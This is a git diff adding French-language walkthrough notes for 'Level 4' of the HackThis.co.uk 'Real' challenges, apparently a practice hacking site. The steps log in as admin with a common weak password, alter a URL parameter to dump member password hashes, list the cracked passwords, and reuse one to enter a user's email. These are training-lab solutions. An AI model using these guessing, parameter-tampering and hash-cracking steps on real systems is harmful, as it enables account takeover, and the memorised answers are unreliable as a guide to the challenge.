@@ -413,6 +413,27 @@ m[m.length]=new Array("Temp","password","Loloips","http://www.google.com");
 ```
 se connecter en tant que "John T"
 ## Level 4
+PlanetBid : se connecter en tant qu'admin, avec "asdfg" comme mot de passe (top 10 des mots de passe)
+
+consulter la base des membres :
+31	Revoked.Mayhem	Caffe@hotbiz.com
+
+consulter la base des ventes avec pour vendeur l'id 31
+31	11	Dr Pepper 3ltr RARE	£1.32
+
+l'acheteur est l'utilisateur 11
+11	nemisis	jfelliot@mail.com
+
+on remarque l'url : https://www.hackthis.co.uk/levels/extras/real/4/planetbid/view.php?members&1=user&2=email
+changer email en pass
+https://www.hackthis.co.uk/levels/extras/real/4/planetbid/view.php?members&1=user&2=pass
+on obtient les hash des mots de passe :
+11	nemisis	742929dcb631403d7c1c1efad2ca2700
+=> chicken
+31	Revoked.Mayhem	231b79b81be75c6fdaabb59754efc025
+=> westwoodworld
+
+on peut maintenant se connecter à l'email avec le login : jfelliot et le mot de passe chicken
 ## Level 5
 ## Level XMAS
 ## Level 6
